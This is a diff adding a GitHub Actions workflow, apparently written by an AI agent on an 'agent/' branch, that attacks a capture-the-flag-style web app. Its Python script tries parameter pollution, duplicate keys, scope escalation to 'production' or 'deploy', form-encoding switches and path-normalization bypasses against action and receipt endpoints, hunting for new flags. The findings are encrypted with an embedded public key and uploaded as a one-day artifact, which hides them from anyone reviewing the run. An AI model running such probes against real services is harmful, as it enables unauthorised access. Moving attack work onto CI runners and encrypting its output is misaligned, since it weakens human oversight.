@@ -1,0 +1,109 @@
+name: launchlet-part3-edgeparser
+on:
+  push:
+    branches: [agent/launchlet-part3-edgeparser-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 4
+    steps:
+      - name: Probe query/body/form/path parser edges and encrypt anomalies
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,urllib.parse
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
+          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          aid='act_6f4b9a2c1d0e8a71'; proj='launchlet-demo-board'; ws='ws-launchlet-public'; receipt='lrec_preview_demo_2026'; ref='preview-8b11c'
+          ah={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':proj,'apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
+          ab={'actionId':aid,'args':{'workspaceId':ws,'projectId':proj}}
+          rb={'receipt':receipt,'project':proj}
+          action='/api/actions/invoke'; redeem='/api/receipts/redeem'
+          baseline_a=s.post(base+action,headers=ah,json=ab,timeout=8); baseline_r=s.post(base+redeem,headers=ah,json=rb,timeout=8)
+          res=[{'name':'baseline_action','status':baseline_a.status_code,'body':baseline_a.text},{'name':'baseline_redeem','status':baseline_r.status_code,'body':baseline_r.text}]
+          def record(name,r,sent=None):
+            item={'name':name,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
+            if sent is not None:item['sent']=sent
+            res.append(item)
+            flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+            if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2)); return True
+            return False
+          # Action query/body conflicts and duplicate query keys.
+          qvals={
+            'actionId':[aid,'exportDeploy','inspectDeploy',ref],
+            'workspaceId':[ws,'ws-launchlet-internal'],
+            'projectId':[proj,'Enterprise rollout closeout','enterprise-rollout-closeout',ref],
+            'scope':['preview','deploy','release','production','enterprise'],
+            'mode':['preview','deploy','release','production'],
+            'operation':['inspect','export','promote','publish','release'],
+            'deployRef':[ref,receipt], 'ref':[ref], 'receipt':[receipt]
+          }
+          for k,vals in qvals.items():
+            for v in vals:
+              qs=urllib.parse.urlencode([(k,v)])
+              r=s.post(base+action+'?'+qs,headers=ah,json=ab,timeout=8)
+              if r.status_code!=baseline_a.status_code or r.text!=baseline_a.text:
+                if record('action_query_'+k,r,qs): raise SystemExit
+            if len(vals)>1:
+              q=urllib.parse.urlencode([(k,vals[0]),(k,vals[-1])]); r=s.post(base+action+'?'+q,headers=ah,json=ab,timeout=8)
+              if r.status_code!=baseline_a.status_code or r.text!=baseline_a.text:
+                if record('action_dupq_'+k,r,q): raise SystemExit
+              q=urllib.parse.urlencode([(k,vals[-1]),(k,vals[0])]); r=s.post(base+action+'?'+q,headers=ah,json=ab,timeout=8)
+              if r.status_code!=baseline_a.status_code or r.text!=baseline_a.text:
+                if record('action_dupq_rev_'+k,r,q): raise SystemExit
+          # Redeem query/body conflicts.
+          rqvals={
+            'receipt':[receipt,ref,'drec_preview_8b11c','lrec_deploy_demo_2026'],
+            'project':[proj,'ws-launchlet-internal','Enterprise rollout closeout','enterprise-rollout-closeout',ref],
+            'scope':['preview:receipt:read','deploy:inspect','deploy:export','release:read'],
+            'mode':['preview','deploy','release'], 'deployRef':[ref], 'ref':[ref]
+          }
+          for k,vals in rqvals.items():
+            for v in vals:
+              q=urllib.parse.urlencode([(k,v)]); r=s.post(base+redeem+'?'+q,headers=ah,json=rb,timeout=8)
+              if r.status_code!=baseline_r.status_code or r.text!=baseline_r.text:
+                if record('redeem_query_'+k,r,q): raise SystemExit
+            if len(vals)>1:
+              for order in [(vals[0],vals[-1]),(vals[-1],vals[0])]:
+                q=urllib.parse.urlencode([(k,order[0]),(k,order[1])]); r=s.post(base+redeem+'?'+q,headers=ah,json=rb,timeout=8)
+                if r.status_code!=baseline_r.status_code or r.text!=baseline_r.text:
+                  if record('redeem_dupq_'+k,r,q): raise SystemExit
+          # Form encodings on known endpoints.
+          forms=[
+            ('action_form',action,{'actionId':aid,'workspaceId':ws,'projectId':proj,'deployRef':ref}),
+            ('redeem_form',redeem,{'receipt':receipt,'project':proj,'deployRef':ref})]
+          for name,p,data in forms:
+            h={k:v for k,v in ah.items() if k.lower()!='content-type'}; h['Content-Type']='application/x-www-form-urlencoded'
+            r=s.post(base+p,headers=h,data=data,timeout=8); record(name,r,data)
+          # Path normalization variants for the exact action route.
+          pvars=['/api/actions/invoke/','/api//actions/invoke','/api/actions//invoke','/api/actions/./invoke','/api/foo/../actions/invoke','/api/actions/%69nvoke','/api/%61ctions/invoke','//api/actions/invoke']
+          for p in pvars:
+            r=s.post(base+p,headers=ah,json=ab,timeout=8,allow_redirects=False)
+            if not (r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n')):
+              if record('path_variant',r,p): raise SystemExit
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-edgeparser-encrypted
+          path: artifact/
+          retention-days: 1
